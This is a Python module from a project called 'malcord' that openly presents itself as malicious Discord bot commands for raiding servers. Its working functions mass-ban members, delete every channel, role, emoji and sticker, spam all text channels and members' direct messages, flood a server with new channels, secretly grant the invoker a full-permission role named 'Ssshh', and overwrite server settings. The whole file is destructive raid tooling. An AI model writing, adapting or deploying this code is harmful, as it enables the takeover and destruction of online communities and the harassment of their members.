"""
malcord - ctxcommands.py

This module contains all of the malicious bot commands provided by malcord,
implemented using commands.Bot and commands.Context from discord.ext.commands.

===============================================================================

FUNCTIONS:

    nick_all: None
        nicknames every member in a guild
    
    msg_all: None
        sends a message to every member in a guild
    
    role_all: None
        creates a role and gives it to every member in a guild
    
    spam_text_channels: None
        spams every text channel in a guild
    
    delete_channels: None
        deletes every channel in a guild
    
    make_channels: None
        creates a specified number of channels in a guild
    
    admin: None
        creates an admin role and gives it to a member in a guild
    
    ban_all: None
        bans all members in a guild from it
    
    del_emoji: None
        deletes all emoji from a guild
        
    del_stickers: None
        deletes all stickers from a guild
    
    settings_fuck_guild: None
        edits various settings of a guild
        
"""

from random import randint

import discord
from discord.ext import commands

from exceptions import InvalidChannelTypeException

TEXT_CHANNEL = 1
VOICE_CHANNEL = 2
RANDOM_CHANNEL = 3


async def nick_all(ctx: commands.Context, nickname: str) -> None:
    """
    This command nicknames every member in a guild.
    
    To use this command, the bot must have the `Manage Nicknames` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await nick_all(ctx, "Raided")
    ```

    Args:
        ctx (commands.Context): the context of the invoked command.
        nickname (str): the nickname to give to every member in the guild.
    """
    for member in ctx.guild.members:
        if member.id != ctx.author.id:
            try:
                await member.edit(nick=nickname)
            except discord.HTTPException:
                continue


async def msg_all(ctx: commands.Context, message: str) -> None:
    """
    This command messages every member in a guild.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await msg_all(ctx, "Raided")
    ```

    Args:
        ctx (commands.Context): the context of the invoked command.
        message (str): the message to send to every member in the guild.
    """
    for member in ctx.guild.members:
        if member.id != ctx.author.id:
            try:
                await member.send(message)
            except discord.HTTPException:
                continue


async def role_all(guild: discord.Guild, name: str, color: int = 0xfff) -> None:
    """
    This command creates a role and gives it to every member in a guild.
    
    To use this command, the bot must have the `Manage Roles` permission.

    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await role_all(ctx.guild, "Raided", 0xfff)
    ```
    
    Args:
        guild (discord.Guild): the guild to create roles and role members in.
        name (str): the name of the role to create.
        color (int, optional): the color of the role to create, as an integer. Defaults to 0xfff.
    """
    role = await guild.create_role(name=name, color=color)
    for member in guild.members:
        try:
            await member.add_roles(role)
        except discord.HTTPException:
            continue


async def spam_text_channels(bot: commands.Bot, ctx: commands.Context, message: str) -> None:
    """
    This command sends a message to every text channel in a guild, indefinitely.
    
    To use this command, the bot must have the `Send Messages` permission.

    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await spam_text_channels(self, ctx, "Raided")
    ```
    
    Args:
        bot (commands.Bot): the bot itself; passed to create a new task.
        ctx (commands.Context): the context of the invoked command.
        message (str): the message to send in each text channel.
    """
    def check_reply(spam_message: str) -> bool:
        return (spam_message == 'stop') and (spam_message.author == ctx.author)
    
    async def spam_messages() -> None:
        while True:
            for channel in ctx.guild.text_channels:
                try:
                    await channel.send(message)
                except discord.HTTPException:
                    continue
    
    spam_task = bot.loop.create_task(spam_messages())
    await bot.wait_for('message', check=check_reply)
    spam_task.cancel()


async def delete_channels(guild: discord.Guild) -> None:
    """
    This command deletes every channel in a guild.
    
    To use this command, the bot must have the `Manage Channels` permission.   
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await delete_channels(ctx.guild)
    ``` 
    
    Args:
        guild (discord.Guild): the guild to delete all channels from.
    """
    for channel in guild.channels:
        try:
            await channel.delete()
        except discord.HTTPException:
            continue


async def make_channels(guild: discord.Guild, channel_name: str, 
                        channel_type: int = 1, number_of_channels: int = 100) -> None:
    """
    This command will create a specified number of channels in a guild.
    These channels will be a given a specified name and type.
    
    The type of channel is determined by the `channel_type` integer parameter.
    Within this module, there are three channel type integer constants:
    
    `TEXT_CHANNEL`, `VOICE_CHANNEL`, and `RANDOM_CHANNEL`.
    
    Random channel type will randomly choose between text and voice channels.

    To use this command, the bot must have the `Manage Channels` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await make_channels(ctx.guild, "Raided", RANDOM_CHANNEL, 250)
    ```
    
    Args:
        guild (discord.Guild): the guild to create channels in.
        channel_name (str): the name of the channels created.
        channel_type (int, optional): the type of channel to create. Defaults to 1.
        number_of_channels (int, optional): the number of channels to create. Defaults to 100.

    Raises:
        InvalidChannelTypeException: raised if the channel type integer constant is invalid.
    """
    if channel_type == TEXT_CHANNEL:
        for _ in range(0, number_of_channels):
            try:
                await guild.create_text_channel(channel_name)
            except discord.HTTPException:
                continue
    elif channel_type == VOICE_CHANNEL:
        for _ in range(0, number_of_channels):
            try:
                await guild.create_voice_channel(channel_name)
            except discord.HTTPException:
                continue
    elif channel_type == RANDOM_CHANNEL:
        for _ in range(0, number_of_channels):
            try:
                if randint(0, 1) == 0:
                    await guild.create_text_channel(channel_name)
                else:
                    await guild.create_voice_channel(channel_name)
            except discord.HTTPException:
                continue
    else:
        raise InvalidChannelTypeException(
            'An invalid channel type integer constant was provided. Please use only 1, 2 or 3.')


async def admin(guild: discord.Guild, member: discord.Member, name: str, color: int = 0xfff) -> None:
    """
    This command will create an admin role and grant it to a member in
    a guild.
    
    To use this command, the bot must have the `Administrator` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await admin(ctx.guild, ctx.author, "Ssshh")
    ```

    Args:
        guild (discord.Guild): the guild to create the admin role in.
        member (discord.Member): the member to grant the admin role to.
        name (str): the name of the admin role to create.
    """
    role = await guild.create_role(name=name, color=color, permissions=discord.Permissions.all())
    await member.add_roles(role)


async def ban_all(bot: commands.Bot, ctx: commands.Context) -> None:
    """
    This command will ban all members from a guild.
    
    To use this command, the bot must have the `Ban Members` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await ban_all(ctx.guild)
    ```
    
    Args:
        guild (discord.Guild): the guild to ban all members from.
    """
    for member in ctx.guild.members:
        if not (
            (member.id == bot.user.id) or
            (member.id == ctx.author.id) or
            (member.id == ctx.guild.owner.id)
            ):
            try:
                await member.ban()
            except discord.HTTPException:
                continue


async def del_roles(guild: discord.Guild) -> None:
    """
    This command will delete all roles from a guild.
    
    To use this command, the bot must have the `Manage Roles` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await del_roles(ctx.guild)
    ```
    
    Args:
        guild (discord.Guild): the guild to delete all roles from.
    """
    for r in guild.roles:
        try:
            await r.delete()
        except discord.HTTPException:
            continue


async def del_emoji(guild: discord.Guild) -> None:
    """
    This command will delete all emoji from a guild.
    
    To use this command, the bot must have the `Manage Emojis and Stickers` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await del_emoji(ctx.guild)
    ```
    
    Args:
        guild (discord.Guild): the guild to delete all emoji from.
    """
    for e in guild.emojis:
        try:
            await e.delete()
        except discord.HTTPException:
            continue


async def del_stickers(guild: discord.Guild) -> None:
    """
    This command will delete all sticker from a guild.
    
    To use this command, the bot must have the `Manage Emojis and Stickers` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await del_stickers(ctx.guild)
    ```
    
    Args:
        guild (discord.Guild): the guild to delete all stickers from.
    """
    for s in guild.stickers:
        try:
            await s.delete()
        except discord.HTTPException:
            continue


async def settings_fuck_guild(guild: discord.Guild, name: str = '', description: str = '', img_path: str = '') -> None:
    """
    This command will edit various settings of a guild.
    
    Settings that will be edited include the following:
    
    - name is set to the `name` argument passed.
    - description is set to the `description` argument passed.
    - icon is set to the `img_path` argument passed. 
    - banner is set to the `img_path` argument passed.
    - splash is set to `img_path` argument passed.
    - discovery_splash is set to `img_path` argument passed.
    - community is set to False.
    - default_notifications is set to all messages.
    - verification_level is set to the highest level.
    - explicit_content_filter is set to all members.
    - premium_progress_bar_enabled is set to False.
    - preferred_locale is set to japanese.
    
    If `name == ''`, the name setting will remain unchanged.
    
    If `description == ''` the description setting will remain unchanged.
    
    If `img_path == ''`, the icon, banner, splash, and discovery_splash settings will
    remain unchanged.
    
    To use this command, the bot must have the `Manage Server` permission.
    
    Call this method in a bot command method like so:
    ```
    async def bot_command_method(self, ctx: commands.Context):
        ...
        await settings_fuck_guild(ctx.guild, 'c:/img.jpg')
    ```
    
    Args:
        guild (discord.Guild): the guild to edit.
        name (str, optional): the new name of the guild. Defaults to ''.
        description (str, optional): the new description of the guild. Defaults to ''.
        img_path (str, optional): the path to the new image for the guild. Defaults to ''.
    """
    if name != '':
        await guild.edit(name=name)
    
    if description != '':
        await guild.edit(description=description)
    
    if img_path != '':
        with open(img_path, 'rb') as f:
            icon = f.read()
        try:
            await guild.edit(icon=icon)
            await guild.edit(banner=icon)
            await guild.edit(splash=icon)
            await guild.edit(discovery_splash=icon)
        except discord.HTTPException:
            pass
                
    await guild.edit(community=False)
    await guild.edit(default_notifications=discord.NotificationLevel.all_messages)
    await guild.edit(verification_level=discord.VerificationLevel.highest)
    await guild.edit(explicit_content_filter=discord.ContentFilter.all_members)
    await guild.edit(premium_progress_bar_enabled=False)
    await guild.edit(preferred_locale=discord.Locale.japanese)
